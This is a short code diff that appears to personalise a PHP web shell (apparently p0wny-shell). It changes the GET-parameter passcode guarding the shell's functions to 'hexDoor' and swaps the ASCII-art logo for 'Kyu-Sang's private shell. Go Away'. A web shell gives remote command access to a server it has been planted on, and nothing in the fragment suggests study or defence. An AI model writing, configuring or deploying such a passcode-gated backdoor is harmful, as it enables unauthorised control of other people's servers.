@@ -75,7 +75,7 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
-if ($_GET['passcode'] == 'get_fucked') {
+if ($_GET['passcode'] == 'hexDoor') {
     if (isset($_GET["feature"])) {
 
         $response = NULL;
@@ -484,12 +484,7 @@ if ($_GET['passcode'] == 'get_fucked') {
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">
-        ___                         ____      _          _ _        _  _   <span></span>
- _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
-| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
-| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
-| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
-|_|                         |___/  \____/                                  <span></span>
+Kyu-Sang's private shell. Go Away<span></span>
                 </div>
             </pre>
             <div id="shell-input">
